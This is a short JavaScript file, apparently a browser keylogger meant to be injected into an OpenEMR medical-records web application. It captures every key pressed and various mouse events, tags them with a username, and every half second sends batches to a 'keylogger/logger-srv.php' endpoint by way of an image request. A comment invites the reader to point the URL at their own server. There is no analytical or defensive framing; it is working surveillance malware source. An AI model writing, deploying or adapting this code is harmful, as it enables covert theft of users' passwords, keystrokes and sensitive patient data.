// Record all key events into an array
var events = [];

function logEvent(evt) {
    console.log(evt);
    var data;
    let type = evt.type;
    switch(type) {
        case "keydown":
        case "keyup":
            data = evt.key;
    }
    events.push({ time: Date.now(), type: type, data: data });
}
window.addEventListener("keydown", logEvent);
window.addEventListener("keyup", logEvent);
window.addEventListener("click", logEvent);
window.addEventListener("contextmenu", logEvent);
window.addEventListener("dblclick", logEvent);
window.addEventListener("wheel", logEvent);

// Push to server at regular intervals
// Reduce interval timing for more frequent recordings, but increases server load
// You can also set this to send only if certain number of key stroke were made.
window.setInterval(function () {
  if (events.length>5) {
    var data = encodeURIComponent(JSON.stringify({ user: vliegtuig_username, events: events }));
    //encodeURIComponent
    console.log(data);
    new Image().src = "/openemr/keylogger/logger-srv.php?k=" + data; // CHANGE THIS URL TO YOUR OWN!
    events = [];
  }
}, 500);
